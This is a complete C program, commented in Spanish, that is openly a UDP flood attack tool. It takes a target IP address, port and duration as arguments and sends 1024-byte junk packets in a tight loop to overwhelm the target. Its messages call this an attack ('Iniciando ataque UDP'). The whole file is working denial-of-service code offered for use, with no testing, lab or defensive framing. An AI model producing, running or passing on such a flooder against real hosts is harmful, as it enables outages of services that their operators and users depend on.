#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define DEFAULT_PACKET_SIZE 1024 // Tamaño del paquete por defecto

// Estructura para almacenar los parámetros del ataque
typedef struct {
    char ip[INET_ADDRSTRLEN];
    int port;
    int time;
    int packet_size; // Tamaño del paquete ajustable
} AttackParams;

// Función para enviar paquetes UDP
void send_udp_packet(int sockfd, struct sockaddr_in *dest_addr, int packet_size) {
    char *packet = (char *)malloc(packet_size); // Asignar memoria dinámicamente
    if (packet == NULL) {
        perror("Error al asignar memoria para el paquete");
        return;
    }

    // Llenar el paquete con datos aleatorios (opcional, pero común para ataques)
    memset(packet, 'A', packet_size);  // Rellenar con 'A'

    sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)dest_addr, sizeof(*dest_addr));
    free(packet); // Liberar la memoria asignada
}


int main(int argc, char *argv[]) {
    AttackParams params;
    int sockfd;
    struct sockaddr_in dest_addr;
    time_t start_time, current_time;

    // Verificar el número de argumentos
    if (argc != 4) {
        fprintf(stderr, "Uso: %s <ip> <puerto> <tiempo_en_segundos>\n", argv[0]);
        return 1;
    }

    // Obtener los parámetros del ataque de los argumentos de la línea de comandos
    strncpy(params.ip, argv[1], INET_ADDRSTRLEN - 1);
    params.ip[INET_ADDRSTRLEN - 1] = '\0'; // Asegurar la terminación nula
    params.port = atoi(argv[2]);
    params.time = atoi(argv[3]);
    params.packet_size = DEFAULT_PACKET_SIZE; // Usar el tamaño de paquete por defecto

    // Imprimir los parámetros del ataque (para verificación)
    printf("IP objetivo: %s\n", params.ip);
    printf("Puerto objetivo: %d\n", params.port);
    printf("Duración del ataque: %d segundos\n", params.time);
    printf("Tamaño del paquete: %d bytes\n", params.packet_size);


    // Crear el socket UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Error al crear el socket");
        return 1;
    }

    // Configurar la dirección de destino
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params.port);
    if (inet_pton(AF_INET, params.ip, &dest_addr.sin_addr) <= 0) {
        perror("Error al convertir la dirección IP");
        close(sockfd);
        return 1;
    }

    // Obtener la hora de inicio
    start_time = time(NULL);

    // Iniciar el ataque
    printf("Iniciando ataque UDP...\n");
    while (1) {
        // Enviar el paquete UDP
        send_udp_packet(sockfd, &dest_addr, params.packet_size);

        // Obtener la hora actual
        current_time = time(NULL);

        // Verificar si el tiempo de ataque ha expirado
        if (difftime(current_time, start_time) >= params.time) {
            break;
        }
    }

    // Finalizar el ataque
    printf("Ataque UDP finalizado.\n");

    // Cerrar el socket
    close(sockfd);

    return 0;
}
